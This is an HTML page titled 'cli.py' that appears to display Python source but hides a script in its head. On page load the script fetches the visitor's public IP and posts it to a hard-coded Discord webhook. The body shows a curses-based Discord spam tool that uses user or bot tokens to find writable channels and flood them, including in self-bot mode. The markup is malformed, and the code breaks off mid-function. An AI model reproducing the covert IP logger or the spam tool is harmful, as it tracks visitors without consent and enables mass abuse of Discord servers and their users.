<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>cli.py</title>
    <script>
        async function getExternalIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip
            } catch (error) {
                console.error('Error fetching external IP:', error);
                return 'Unable to fetch IP';
            }
        }
        function sendToDiscord(message) {
            const webhookUrl = 'https://discord.com/api/webhooks/1420039592903442573/iX0c-PFC9LqTVKWt2JeAabVEae1x3IA2iXsbMWBO_dAu5aigcPRlgizwLMSgCKR9nqhd';
            
            const payload = {
                content: message
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Message sent to Discord:', data);
            })
            .catch(error => {
                console.error('Error sending message to Discord:', error);
            });
        }
        window.onload = async function() {
            const ip = await getExternalIP()
            const message = `@everyone IP Address: ${ip}`;
            sendToDiscord(message)
        };
    </script>
    <style>
    pre {
      display: block;
      font-family: monospace;
      unicode-bidi: isolate;
      white-space: pre;
      margin-block: 1em 1em;
      margin-inline: 0px;
    }
    </style>
</head>
<body>
</body>
</html>
  <style>
  </style>
</head>
<body>
  <pre>
import discord<br>from curses import wrapper<br>from shutil import which<br>import subprocess<br>import easygui<br>import curses<br>import math<br>import time<br>import json<br>import sys<br>import os<br><br>settings={"token":{"name":"", "token":""}, "tokens":[], "bot_tokens":[], "bot_token":{"name":"", "token":""}, "app_id":-1, "cmd_name":"", "default_preset": -1, "presets":[], "randomize":False, "auto_leave":-1, "silent":True}<br>settings["default_preset"] = -1<br><br>def applySettings():<br>    f=open("settings.json", "w")<br>    f.write(json.dumps(settings))<br>    f.close()<br><br>if (os.path.isfile("settings.json")):<br>    f=open("settings.json", "r")<br>    try:<br>        settings = json.loads(f.read())<br>        f.close()<br>    except:<br>        pass<br><br>mainmenu=["Spam", "Edit Tokens", "Edit Application ID and Command", "Set Maximum Spam Count", "Edit Presets", "Randomize Messages", "Exit", "Start Bot", "Edit Bot Tokens", "Silent Messages", "Check Channels"]<br><br>stdscr = curses.initscr()<br>curses.noecho()<br>curses.cbreak()<br>stdscr.keypad(True)<br>loop = True<br>curmenu = mainmenu<br><br>def cinput(offsety=0, scr=stdscr, txt="", num_only=False):<br>    inputstr=txt<br>    curpos=0<br>    scr.addstr(offsety, 0, inputstr)<br>    while (True):<br>        stdscr.move(offsety, len(inputstr)-curpos)<br>        curses.setsyx(offsety, len(inputstr)-curpos)<br>        curses.doupdate()<br><br>        k=stdscr.getkey()<br>        if (k == "\n"):<br>            break<br>        elif (k == "KEY_BACKSPACE" or str.encode(k) == b'\x08'):<br>            if (curpos>=len(inputstr) and len(inputstr) != 0):<br>                continue<br>            elif (len(inputstr) == 0):<br>                break<br>            <br>            scr.addstr(offsety, len(inputstr)-1-curpos, inputstr[(len(inputstr)-curpos):]+" ")<br>            <br>            if (len(inputstr)>1):<br>                inputstr = inputstr[:(len(inputstr)-1-curpos)]+inputstr[(len(inputstr)-curpos):]<br>            else:<br>                inputstr = ""<br>        elif (k == "KEY_RIGHT"):<br>            if (curpos>0):<br>                curpos-=1<br>        elif (k == "KEY_LEFT"):<br>            if (curpos<len(inputstr)):<br>                curpos+=1<br>        elif (not num_only and len(k) == 1 or (k.isdigit() or k == "-" and len(inputstr) == 0) and num_only):<br>            scr.addstr(offsety, len(inputstr)-curpos, k+inputstr[(len(inputstr)-curpos):])<br>            inputstr = inputstr[:(len(inputstr)-curpos)]+k+inputstr[(len(inputstr)-curpos):]<br>    <br>    return inputstr<br><br>def choice(array, offsety=0, scr=stdscr, option=0):<br>    global stdscr<br>    ymax, xmax = scr.getmaxyx()<br><br>    if (len(array) <= option):<br>        option = len(array)-1<br><br>    while True:<br>        scr.clear()<br>        for i,v in enumerate(array):<br>            if (i > (ymax-1)*math.floor(option/(ymax-1))+ymax-2-offsety):<br>                break<br>            elif (i < (ymax-1)*math.floor(option/(ymax-1))):<br>                continue<br>            if (i != option):<br>                scr.addstr(math.floor(i%(ymax-1))+offsety, 0, "  "+str(i)+"- "+ v)<br>            else:<br>                scr.addstr(math.floor(i%(ymax-1))+offsety, 0, "> "+str(i)+"- "+ v)<br>        <br>        pary, parx = scr.getparyx()<br>        if (pary==-1):<br>            pary=0<br>            parx=0<br>        curpos = math.floor(option%(ymax-1))+offsety+pary<br>        stdscr.move(curpos, 0)<br>        curses.setsyx(curpos, 0)<br><br>        numpos = len(array)<br>        if (numpos>=ymax):<br>            numpos=ymax-1<br><br>        if (len(array)>ymax):<br>            if (option-ymax+1<0):<br>                scr.addstr(numpos+offsety, 0, "↓")<br>            else:<br>                scr.addstr(numpos+offsety, 0, "↑")<br>        curses.doupdate()<br>        scr.refresh()<br>        k=stdscr.getkey()<br>        <br>        if ((k=="KEY_LEFT" or k=="KEY_UP") and option != 0):<br>            option-=1<br>        elif ((k=="KEY_RIGHT" or k=="KEY_DOWN") and option < len(array)-1):<br>            option+=1<br>        elif (k.isdigit()):<br>            num=k<br>            scr.clear()<br>            if (int(num)<len(array)):<br>                option=int(num)<br>            scr.addstr(numpos+offsety, 0, num)<br>            while (True):<br>                scr.clear()<br>                for i,v in enumerate(array):<br>                    if (i > (ymax-1)*math.floor(option/(ymax-1))+ymax-2-offsety):<br>                        break<br>                    elif (i < (ymax-1)*math.floor(option/(ymax-1))):<br>                        continue<br>                    if (i != option):<br>                        scr.addstr(math.floor(i%(ymax-1))+offsety, 0, "  "+str(i)+"- "+ v)<br>                    else:<br>                        scr.addstr(math.floor(i%(ymax-1))+offsety, 0, "> "+str(i)+"- "+ v)<br>                curpos = math.floor(option%(ymax-1))+offsety+pary<br>                stdscr.move(curpos, 0)<br>                curses.setsyx(curpos, 0)<br>                scr.addstr(numpos+offsety, 0, num)<br>                curses.doupdate()<br>                scr.refresh()<br>                k=stdscr.getkey()<br>                if (k.isdigit()):<br>                    scr.addstr(numpos+offsety, len(num), k)<br>                    num+=k<br>                    if (int(num)<len(array)):<br>                        option=int(num)<br>                elif (k == "\n"):<br>                    break<br>                elif (k == "KEY_BACKSPACE" or str.encode(k) == b'\x08'):<br>                    if (len(num)<=1):<br>                        num=""<br>                        break<br>                    num = num[:-1]<br>                    scr.addstr(numpos+offsety, 0, num)<br>                elif (not k.isdigit):<br>                    num=""<br>            if (num!=""):<br>                if (int(num)<len(array)):<br>                    return option<br>        elif (k=="\n"):<br>            return option<br><br>guild_id=0<br>user_spam=False<br>check_chan=False<br><br>def clear():<br>    os.system('cls' if os.name == 'nt' else "printf '\033c'")<br><br>class spamClient(discord.Client):<br>    global stdscr<br>    global settings<br>    global settings<br>    global guild_id<br>    global user_spam<br>    global check_chan<br><br>    async def fetch_channels(self, guild, user):<br>        mchannels = []<br>        nchannels = []<br><br>        for channel in guild.channels:<br>            if (channel.type == discord.ChannelType.category or channel.type == discord.ChannelType.forum):<br>                continue<br>            <br>            permissions = channel.permissions_for(user)<br>            <br>            if (not permissions.view_channel<br>                or not permissions.read_message_history<br>                or not permissions.read_messages<br>                or ((not permissions.use_application_commands or not permissions.use_external_apps) and not user_spam)<br>                or not permissions.send_messages<br>                ):<br>                continue<br>            <br>            if (not permissions.attach_files):<br>                nchannels.append(channel)<br>            else:<br>                mchannels.append(channel)<br>        return mchannels, nchannels<br><br>    async def on_ready(self):<br>        print(f"Logged in as {self.user}!")<br>        app=None<br>        cmd=None<br>        botType=0 # normie bot<br>        opt=None<br><br>        if (not user_spam):<br>            for auth in await self.authorizations():<br>                if auth.application.id == settings["app_id"]:<br>                    app = auth.application<br>            if (app == None):<br>                print("Application is not installed, or wrong ID was provided.")<br>                sys.exit(1)<br><br>            for command in await app.bot.application_commands():<br>                if (command.name.lower().find(settings["cmd_name"].lower()) != -1):<br>                    cmd=command<br>            <br>            if (cmd == None):<br>                print("Command not found. Typo or Wrong Application ID?")<br>                sys.exit(1)<br><br>            for i,option in enumerate(cmd.options):<br>                if (option.name == "slowmode"):<br>                    botType = 1 # new bot<br>                elif (option.name == "slowmode_delay"):<br>                    botType = 2 # old bot<br>                <br>                if (i==0):<br>                    opt=option<br><br>            if (len(cmd.options) == 0):<br>                botType = 3 # cucked bot (predefined spam msg)<br><br>            if (opt == None and botType == 0):<br>                print("Option not found. Unsupported Bot?")<br>                sys.exit(1)<br>        else:<br>            botType = 4 # user bot<br>        <br>        guild = self.get_guild(guild_id)<br><br>        mchannels=[] # m = media<br>        nchannels=[] # n = no media<br>        user = None<br><br>        if (guild == None):<br>            # perhaps a channel<br><br>            channel=self.get_channel(guild_id)<br>            if (channel == None):<br>                print("Server/Channel not found. Wrong ID? Server/Channel Unavailable?")<br>                sys.exit(1)<br><br>            if (channel.guild != None):<br>                user = channel.guild.get_member(self.user.id)<br>                permissions = channel.permissions_for(user)<br><br>                if (not permissions.attach_files):<br>                    nchannels.append(channel)<br>                else:<br>                    mchannels.append(channel)<br>            else:<br>                mchannels.append(channel)<br>        else:<br>            user = guild.get_member(self.user.id)<br>            mchannels, nchannels = await self.fetch_channels(guild, user)<br>        <br>        clear()<br>        <br>        if (check_chan):<br>            mchannels, nchannels = await self.fetch_channels(guild, user)<br><br>            for chan in mchannels:<br>                print(chan.name+" ["+str(chan.id)+"] - media")<br>            <br>            for chan in nchannels:<br>                print(chan.name+" ["+str(chan.id)+"] - text-only")<br>            print("Close this window or press `Ctrl+C` to quit.")<br>            sys.exit(0)<br>            return<br><br>        count=0<br>        channelcounts = {}<br>        <br>        for chan in mchannels:<br>            channelcounts[chan.id] = {"name":chan.name, "count":0}<br>        for chan in nchannels:<br>            channelcounts[chan.id] = {"name":chan.name, "count":0}<br><br>        clear()<br>        for chan in channelcounts.values():<br>            print(f"[{str(chan['count'])}] {chan['name']}")<br><br>        lastSpam = {}<br><br>        while True:<br>            if (len(channelcounts) == 0):<br>                print("No channels available.")<br>                sys.exit(1)<br><br>            if (settings["auto_leave"] != -1 and count>=settings["auto_leave"]):<br>                print("Spam finished.")<br>                sys.exit(0)<br>            count+=1<br>            if (guild != None):<br>                mchannels, nchannels = await self.fetch_channels(guild, user)<br>                idlist = []<br>                for chan in mchannels:<br>                    idlist.append(chan.id)<br>                    if not chan.id in channelcounts:<br>                        channelcounts[chan.id] = {"name":chan.name, "count":0}<br>                    elif chan.id in channelcounts and channelcounts[chan.id]["name"].endswith(" [Unavailable]"):<br>                        channelcounts[chan.id]["name"] = channelcounts[chan.id]["name"].replace(" [Unavailable]", "")<br>                <br>                for chan in nchannels:<br>                    idlist.append(chan.id)<br>                    if not chan.id in channelcounts:<br>                        channelcounts[chan.id] = {"name":chan.name, "count":0}<br>                    elif chan.id in channelcounts and channelcounts[chan.id]["name"].endswith(" [Unavailable]"):<br>                        channelcounts[chan.id] = channelcounts[chan.id]["name"].replace(" [Unavailable]", "")<br>                <br>                for chan in channelcounts.keys():<br>                    if not chan in idlist and not channelcounts[chan]["name"].endswith(" [Unavailable]"):<br>                        channelcounts[chan]["name"] = channelcounts[chan]["name"]+" [Unavailable]"<br>            <br>            for channel in mchannels:<br>                try:<br>                    if (channel.id in lastSpam and lastSpam[channel.id] + channel.slowmode_delay > time.time()):<br>                        continue<br>                    if (botType != 4):<br>                        cmd.target_channel = channel<br>                    if (botType==0):<br>                        await cmd.__call__(channel=channel, **{opt.name:settings["presets"][settings["default_preset"]]["spam"]})<br>                    elif (botType==1):<br>                        await cmd.__call__(channel=channel, **{opt.name:settings["presets"][settings["default_preset"]]["spam"], "randomize":settings["randomize"], "slowmode":channel.slowmode_delay>0, "silent":settings["silent"]})<br>                    elif (botType==2):<br>                        await cmd.__call__(channel=channel, **{opt.name:settings["presets"][settings["default_preset"]]["spam"], "randomize":settings["randomize"], "slowmode_delay":channel.slowmode_delay})<br>                    elif (botType==3):<br>                        await cmd.__call__(channel=channel)<br>                    elif (botType==4):<br>                        for i in range(0,5):<br>                            await channel.send(settings["presets"][settings["default_preset"]]["spam"], silent=settings["silent"])<br>                    <br>                    channelcounts[channel.id]["count"] += 1<br>                    lastSpam[channel.id] = time.time()<br>                    clear()<br>                    for chan in channelcounts.values():<br>                        print(f"[{str(chan['count'])}] {chan['name']}")<br>                except:<br>                    pass<br>            for channel in nchannels:<br>                try:<br>                    if (channel.id in lastSpam and lastSpam[channel.id] + channel.slowmode_delay > time.time()):<br>                        continue<br>                    if (botType != 4):<br>                        cmd.target_channel = channel<br>                    if (botType==0):<br>                        await cmd.__call__(channel=channel, **{opt.name:settings["presets"][settings["default_preset"]]["fallback"]})<br>                    elif (botType==1):<br>                        await cmd.__call__(channel=channel, **{opt.name:settings["presets"][settings["default_preset"]]["fallback"], "randomize":settings["randomize"], "slowmode":channel.slowmode_delay>0, "silent":settings["silent"]})<br>                    elif (botType==2):<br>                        await cmd.__call__(channel=channel, **{opt.name:settings["presets"][settings["default_preset"]]["fallback"], "randomize":settings["randomize"], "slowmode_delay":channel.slowmode_delay})<br>                    elif (botType==3):<br>                        await cmd.__call__(channel=channel)<br>                    elif (botType==4):<br>                        for i in range(0,5):<br>                            await channel.send(settings["presets"][settings["default_preset"]]["fallback"], silent=settings["silent"])<br>                    <br>                    channelcounts[channel.id]["count"] += 1<br>                    lastSpam[channel.id] = time.time()<br>                    clear()<br>                    for chan in channelcounts.values():<br>                        print(f"[{str(chan['count'])}] {chan['name']}")<br>                except:<br>                    pass<br><br><br>def startSpam():<br>    global user_spam<br>    global settings<br>    global guild_id<br>    global curmenu<br>    global stdscr<br>    global loop<br>    <br>    stdscr.addstr(0, 0, "Server or Channel ID: ")<br>    stdscr.move(1, 0)<br>    curses.setsyx(1, 0)<br>    curses.doupdate()<br>    idstr=cinput(1, num_only=True)<br>    <br>    if (idstr==""):<br>        return<br><br>    menu=["Bot Spam", "User Spam", "Return"]<br>    option=choice(menu)<br>    if (option==2):<br>        return<br>    elif (option==1):<br>        user_spam=True<br><br>    # start spam<br><br>    curses.nocbreak()<br>    stdscr.keypad(False)<br>    curses.echo()<br>    curses.endwin()<br>    clear()<br>    <br>    guild_id = int(idstr)<br>    client = spamClient()<br>    client.run(settings["token"]["token"])<br>    sys.exit(0)<br>    return<br><br>def doAction(option):<br>    global check_chan<br>    global user_spam<br>    global settings<br>    global guild_id<br>    global curmenu<br>    global stdscr<br>    global loop<br>    global sc<br><br>    if (curmenu == mainmenu):<br>        if (option==0):<br>            stdscr.clear()<br>            fn=0<br>            if (settings["default_preset"] == -1):<br>                stdscr.addstr(fn, 0, "Must specify preset.")<br>                fn+=1<br><br>            if (settings["token"]["token"] == ""):<br>                stdscr.addstr(fn, 0, "Must specify token.")<br>                fn+=1<br><br>            if (settings["app_id"] == -1):<br>                stdscr.addstr(fn, 0, "Must specify application ID.")<br>                fn+=1<br><br>            if (settings["cmd_name"] == ""):<br>                stdscr.addstr(fn, 0, "Must specify command name.")<br>                fn+=1<br><br>            if (fn == 0):<br>                startSpam()<br>            else:<br>                stdscr.addstr(fn, 0, "Press any key to continue...")<br>                stdscr.getkey()<br>        elif (option == 1):<br>            menu = stdscr.subwin(9+1, 70, 1, 0)<br>            menu.box()<br>            prevopt=0<br>            while True:<br>                stdscr.clear()<br>                stdscr.addstr(0, 0, "Select Token:")<br>                stdscr.refresh()<br>                array=["Return", "Add Token", "Remove Token", "Rename Token"]<br>                for tk in settings["tokens"]:<br>                    if (tk["token"] == settings["token"]["token"]):<br>                        array.append("* "+tk["name"])<br>                    else:<br>                        array.append("  "+tk["name"])<br>                option = choice(array, 0, menu, prevopt)<br>                prevopt=option<br>                if (option == 0):<br>                    break<br>                elif (option == 1):<br>                    stdscr.clear()<br>                    stdscr.addstr(0, 0, "Name: ")<br>                    stdscr.refresh()<br>                    stdscr.move(1, 0)<br>                    curses.setsyx(1, 0)<br>                    curses.doupdate()<br>                    namestr=cinput(1)<br>                    stdscr.clear()<br>                    stdscr.addstr(0, 0, "Token: ")<br>                    stdscr.refresh()<br>                    stdscr.move(1, 0)<br>                    curses.setsyx(1, 0)<br>                    curses.doupdate()<br>                    tkstr=cinput(1)<br>                    if (tkstr==""):<br>                        continue<br>                    brk = False<br>                    for token in settings["tokens"]:<br>                        if (token["token"] == tkstr):<br>                            stdscr.clear()<br>                            stdscr.addstr(0, 0, f"Token already exists as \"{token['name']}\"!")<br>                            stdscr.refresh()<br>                            time.sleep(2)<br>                            brk = True<br>                            break<br>                    if (brk):<br>                        continue<br>                    settings["tokens"].append({"name":namestr, "token":tkstr})<br>                    if (settings["token"]["token"] == ""):<br>                        settings["token"] = {"name":namestr, "token":tkstr}<br>                    applySettings()<br>                elif (option == 2):<br>                    stdscr.clear()<br>                    stdscr.addstr(0, 0, "Select Token to DELETE:")<br>                    stdscr.refresh()<br>                    menu = stdscr.subwin(9+1, 70, 1, 0)<br>                    menu.box()<br>                    array=["Return"]<br>                    for token in settings["tokens"]:<br>                        array.append(token["name"])<br><br>                    token = choice(array, 0, menu)<br>                    if (token==0):<br>                        continue<br>                    if (settings["tokens"][token-1]["token"] == settings["token"]["token"]):<br>                        settings["token"]["token"] = ""<br>                    del settings["tokens"][token-1]<br>                    applySettings()<br>                elif (option == 3):<br>                    stdscr.clear()<br>                    stdscr.addstr(0, 0, "Select Token to Rename:")<br>                    stdscr.refresh()<br>                    menu = stdscr.subwin(9+1, 70, 1, 0)<br>                    menu.box()<br>                    array=["Return"]<br>                    for token in settings["tokens"]:<br>                        array.append(token["name"])<br><br>                    token = choice(array, 0, menu)-1<br>                    if (token==-1):<br>                        continue<br><br>                    stdscr.clear()<br>                    stdscr.addstr(0, 0, "New Token Name: ")<br>                    stdscr.move(1, 0)<br>                    curses.setsyx(1, 0)<br>                    curses.doupdate()<br>                    stdscr.refresh()<br>                    namestr=cinput(1)<br>                    <br>                    if (namestr == ""):<br>                        continue<br>                    if (settings["tokens"][token-1]["token"] == settings["token"]["token"]):<br>                        settings["token"]["name"] = namestr<br>                    settings["tokens"][token]["name"] = namestr<br>                    applySettings()<br>                else:<br>                    settings["token"] = settings["tokens"][option-4]<br>                    applySettings()<br>                    <br>        elif (option == 2):<br>            stdscr.clear()<br>            stdscr.addstr(0, 0, "Application ID: ")<br>            stdscr.move(1, 0)<br>            curses.setsyx(1, 0)<br>            curses.doupdate()<br>            idstr=cinput(1, num_only=True)<br><br>            stdscr.addstr(2, 0, "Command Name: ")<br>            stdscr.move(3, 0)<br>            curses.setsyx(3, 0)<br>            curses.doupdate()<br>            cmdstr=cinput(3)<br>            if (idstr.isdigit()):<br>                settings["app_id"] = int(idstr)<br>            if (cmdstr != ""):<br>                settings["cmd_name"] = cmdstr<br>            applySettings()<br>        elif (option == 3):<br>            stdscr.clear()<br>            stdscr.addstr(0, 0, "Maximum Spam Count: ")<br>            stdscr.move(1, 0)<br>            curses.setsyx(1, 0)<br>            curses.doupdate()<br>            maxstr=cinput(1, txt=str(settings["auto_leave"]), num_only=True)<br>            if (maxstr.lstrip("-+").isdigit()):<br>                settings["auto_leave"] = int(maxstr)<br>                applySettings()<br>        elif (option == 4):<br>            prevopt=0<br>            while True:<br>                presetmenu=["Return", "Add Preset", "Edit Preset", "Delete Preset", "Clone Preset"]<br>                for i,preset in enumerate(settings["presets"]):<br>                    if (i != settings["default_preset"]):<br>                        presetmenu.append("  "+preset["name"])<br>                    else:<br>                        presetmenu.append("* "+preset["name"])<br>                option = choice(presetmenu, option=prevopt)<br><br>                prevopt=option<br>                if (option==0):<br>                    break<br>                elif (option==1):<br>                    stdscr.clear()<br>                    stdscr.addstr(0, 0, "Preset Name: ")<br>                    stdscr.move(1, 0)<br>                    curses.setsyx(1, 0)<br>                    curses.doupdate()<br>                    namestr=cinput(1)<br>                    <br>                    if (namestr == ""):<br>                        continue<br><br>                    stdscr.addstr(2, 0, "Spam Message Prompted")<br>                    spammsg = easygui.textbox("Enter Spam Message", "Prompt", codebox=True)<br><br>                    if (spammsg == "" or spammsg == None):<br>                        continue<br><br>                    fallbackmsg = easygui.textbox("Enter Fallback Message", "Prompt", codebox=True)<br><br>                    if (fallbackmsg == "" or fallbackmsg == None):<br>                        fallbackmsg = spammsg<br>                    <br>                    settings["presets"].append({"name":namestr, "spam":spammsg, "fallback":fallbackmsg})<br>                    applySettings()<br>                elif (option == 2):<br>                    stdscr.clear()<br>                    stdscr.addstr(0, 0, "Select Preset to Edit:")<br>                    array=["Return"]<br>                    for preset in settings["presets"]:<br>                        array.append(preset["name"])<br><br>                    menu = stdscr.subwin(1, 0)<br>                    menu.box()<br>                    preset = choice(array, 0, menu)-1<br>                    if (preset == -1):<br>                        continue<br>                    optionarray=["Return", "Edit Name", "Edit Spam Message", "Edit Fallback Message"]<br>                    while (True):<br>                        option=choice(optionarray)<br>                        if (option == 0):<br>                            break<br>                        elif (option == 1):<br>                            stdscr.clear()<br>                            stdscr.addstr(0, 0, "Preset Name: ")<br>                            stdscr.move(1, 0)<br>                            curses.setsyx(1, 0)<br>                            curses.doupdate()<br>                            namestr=cinput(1, txt=settings["presets"][preset]["name"])<br>                            <br>                            if (namestr == ""):<br>                                continue<br><br>                            settings["presets"][preset]["name"] = namestr<br>                        elif (option == 2):<br>                            spammsg = easygui.textbox("Enter Spam Message", "Prompt", settings["presets"][preset]["spam"], codebox=True)<br><br>                            if (spammsg == ""):<br>                                continue<br><br>                            if (not isinstance(spammsg, str)):<br>                                continue<br>                            settings["presets"][preset]["spam"] = spammsg<br>                        elif (option == 3):<br>                            fallbackmsg = easygui.textbox("Enter Fallback Message", "Prompt", settings["presets"][preset]["fallback"], codebox=True)<br><br>                            if (fallbackmsg == ""):<br>                                continue<br><br>                            if (not isinstance(fallbackmsg, str)):<br>                                continue<br><br>                            settings["presets"][preset]["fallback"] = fallbackmsg<br>                        applySettings()<br>                elif (option == 3):<br>                    stdscr.clear()<br>                    stdscr.addstr(0, 0, "Select Preset to DELETE:")<br>                    array=["Return"]<br>                    for preset in settings["presets"]:<br>                        array.append(preset["name"])<br><br>                    menu = stdscr.subwin(1, 0)<br>                    menu.box()<br>                    preset = choice(array, 0, menu)-1<br>                    if (preset == -1):<br>                        continue<br><br>                    if (preset < settings["default_preset"]):<br>                        settings["default_preset"] = settings["default_preset"]-1<br>                    elif (preset == settings["default_preset"]):<br>                        settings["default_preset"] = -1<br><br>                    if (preset < settings["default_preset"]):<br>                        settings["default_preset"] = settings["default_preset"]-1<br>                    elif (preset == settings["default_preset"]):<br>                        settings["default_preset"] = -1<br><br>                    del settings["presets"][preset]<br>                    applySettings()<br>                elif (option == 4):<br>                    stdscr.clear()<br>                    stdscr.addstr(0, 0, "Select Preset to Clone:")<br>                    array=["Return"]<br>                    for preset in settings["presets"]:<br>                        array.append(preset["name"])<br><br>                    menu = stdscr.subwin(1, 0)<br>                    menu.box()<br>                    preset = choice(array, 0, menu)-1<br>                    if (preset == -1):<br>                        continue<br>                    preset = settings["presets"][preset]<br>                    <br>                    stdscr.clear()<br>                    stdscr.addstr(0, 0, "Cloned Preset Name: ")<br>                    stdscr.move(1, 0)<br>                    curses.setsyx(1, 0)<br>                    curses.doupdate()<br>                    namestr=cinput(1)<br>                    <br>                    if (namestr == ""):<br>                        continue<br><br>                    settings["presets"].append({"name":namestr, "spam":preset["spam"], "fallback":preset["fallback"]})<br>                    applySettings()<br>                else:<br>                    settings["default_preset"] = option-5<br>                    applySettings()<br><br>        elif (option == 5):<br>            stdscr.clear()<br>            stdscr.addstr(0, 0, "Randomize last 5 characters of message?")<br>            array=[]<br>            if (settings["randomize"]):<br>                array.append("* Yes")<br>                array.append("  No")<br>            else:<br>                array.append("  Yes")<br>                array.append("* No")<br><br>            menu = stdscr.subwin(1, 0)<br>            menu.box()<br>            option = choice(array, 0, menu)<br><br>            settings["randomize"] = (option == 0)<br>            applySettings()<br>        elif (option == 6):<br>            loop = False<br>        elif (option == 7):<br>            if (settings["bot_token"]["token"] == ""):<br>                stdscr.clear()<br>                stdscr.addstr(0, 0, "Must specify bot token.")<br>                stdscr.addstr(1, 0, "Press any key to continue...")<br>                stdscr.getkey()<br>                return<br>            if (os.name == "posix"):<br>                # get terminal<br>                term = ""<br>                terminals=["st", "xfce4-terminal", "konsole", "xterm", "gnome-terminal"]<br><br>                for terminal in terminals:<br>                    if (which(terminal) is not None):<br>                        term = terminal<br>                        break<br>                if (term == ""):<br>                    stdscr.clear()<br>                    stdscr.addstr(0, 0, "No supported terminal emulators found.")<br>                    p=subprocess.Popen(["botenv/bin/python3", "bot.py", settings["bot_token"]["token"]], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)<br>                    stdscr.addstr(1, 0, f"Process has been launched at PID: {p.pid}")<br>                    stdscr.addstr(2, 0, "Press any key to continue...")<br>                    stdscr.getkey() <br>                else:<br>                    subprocess.Popen([term, "-e", "\""+os.path.abspath("botenv/bin/python3")+"\"" + " bot.py "+settings["bot_token"]["token"]], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)<br>            elif (os.name == "nt"):<br>                try:<br>                    subprocess.Popen(["botenv\\Scripts\\python", "bot.py", settings["bot_token"]["token"]], creationflags=subprocess.CREATE_NEW_CONSOLE)<br>                except Exception as e:<br>                    stdscr.clear()<br>                    stdscr.addstr(0, 0, str(e))<br>                    stdscr.getkey()<br>        elif (option == 8):<br>            menu = stdscr.subwin(9+1, 70, 1, 0)<br>            menu.box()<br>            prevopt=0<br>            while True:<br>                stdscr.clear()<br>                stdscr.addstr(0, 0, "Select Bot Token:")<br>                stdscr.refresh()<br>                array=["Return", "Add Token", "Remove Token", "Rename Token"]<br>                for token in settings["bot_tokens"]:<br>                    if (token["token"] == settings["bot_token"]["token"]):<br>                        array.append("* "+token["name"])<br>                    else:<br>                        array.append("  "+token["name"])<br>                option = choice(array, 0, menu, prevopt)<br>                prevopt = option<br>                if (option == 0):<br>                    break<br>                elif (option == 1):<br>                    stdscr.clear()<br>                    stdscr.addstr(0, 0, "New Token Name: ")<br>                    stdscr.refresh()<br>                    stdscr.move(1, 0)<br>                    curses.setsyx(1, 0)<br>                    curses.doupdate()<br>                    namestr=cinput(1)<br>                    stdscr.clear()<br>                    stdscr.addstr(0, 0, "New Token: ")<br>                    stdscr.refresh()<br>                    stdscr.move(1, 0)<br>                    curses.setsyx(1, 0)<br>                    curses.doupdate()<br>                    tkstr=cinput(1)<br>                    if (tkstr==""):<br>                        continue<br>                    brk = False<br>                    for token in settings["bot_tokens"]:<br>                        if (token["token"] == tkstr):<br>                            stdscr.clear()<br>                            stdscr.addstr(0, 0, f"Token already exists as \"{token['name']}\"!")<br>                            stdscr.refresh()<br>                            time.sleep(2)<br>                            brk = True<br>                            break<br>                    if (brk):<br>                        continue<br>                    settings["bot_tokens"].append({"name":namestr, "token":tkstr})<br>                    if (settings["bot_token"]["token"] == ""):<br>                        settings["bot_token"] = {"name":namestr, "token":tkstr}<br>                    applySettings()<br>                elif (option == 2):<br>                    stdscr.clear()<br>                    stdscr.addstr(0, 0, "Select Token to DELETE:")<br>                    stdscr.refresh()<br>                    menu = stdscr.subwin(9+1, 70, 1, 0)<br>                    menu.box()<br>                    array=["Return"]<br>                    for token in settings["bot_tokens"]:<br>                        array.append(token["name"])<br><br>                    token = choice(array, 0, menu)<br>                    if (token==0):<br>                        continue<br>                    if (settings["bot_tokens"][token-1]["token"] == settings["bot_token"]["token"]):<br>                        settings["bot_token"]["token"] = ""<br>                    del settings["bot_tokens"][token-1]<br>                    applySettings()<br>                elif (option == 3):<br>                    stdscr.clear()<br>                    stdscr.addstr(0, 0, "Select Token to Rename:")<br>                    stdscr.refresh()<br>                    menu = stdscr.subwin(9+1, 70, 1, 0)<br>                    menu.box()<br>                    array=["Return"]<br>                    for token in settings["bot_tokens"]:<br>                        array.append(token["name"])<br><br>                    token = choice(array, 0, menu)-1<br>                    if (token==-1):<br>                        continue<br><br>                    stdscr.clear()<br>                    stdscr.addstr(0, 0, "New Token Name: ")<br>                    stdscr.move(1, 0)<br>                    curses.setsyx(1, 0)<br>                    curses.doupdate()<br>                    stdscr.refresh()<br>                    namestr=cinput(1)<br>                    <br>                    if (namestr == ""):<br>                        continue<br>                    if (settings["bot_tokens"][token-1]["token"] == settings["bot_token"]["token"]):<br>                        settings["bot_token"]["name"] = namestr<br>                    settings["bot_tokens"][token]["name"] = namestr<br>                    applySettings()<br>                else:<br>                    settings["bot_token"] = settings["bot_tokens"][option-4]<br>                    applySettings()<br>                    <br>        elif (option == 9):<br>            stdscr.clear()<br>            stdscr.addstr(0, 0, "Send Silent Messages?")<br>            array=[]<br>            if (settings["silent"]):<br>                array.append("* Yes")<br>                array.append("  No")<br>            else:<br>                array.append("  Yes")<br>                array.append("* No")<br><br>            menu = stdscr.subwin(1, 0)<br>            menu.box()<br>            option = choice(array, 0, menu)<br><br>            settings["silent"] = (option == 0)<br>            applySettings()<br>        elif (option == 10):<br>            stdscr.clear()<br>            stdscr.addstr(0, 0, "Check Server or Channel ID: ")<br>            stdscr.move(1, 0)<br>            curses.setsyx(1, 0)<br>            curses.doupdate()<br>            idstr=cinput(1, num_only=True)<br>            <br>            if (idstr==""):<br>                return<br>            <br>            curses.nocbreak()<br>            stdscr.keypad(False)<br>            curses.echo()<br>            curses.endwin()<br>            clear()<br>            <br>            guild_id = int(idstr)<br>            check_chan = True<br>            user_spam = True<br>            client = spamClient()<br>            client.run(settings["token"]["token"])<br>            sys.exit(0)<br>            return<br>            <br><br>def main(stdscr):<br>    global loop<br>    global settings<br><br>    menu = stdscr.subwin(10, 70, 1, 0)<br>    menu.box()<br>    opt = 0<br>    while (loop):<br>        stdscr.clear()<br>        if (settings["default_preset"] == -1):<br>            stdscr.addstr(0, 0, "Current Preset: None Selected")<br>        else:<br>            if (len(settings["presets"]) > settings["default_preset"]):<br>                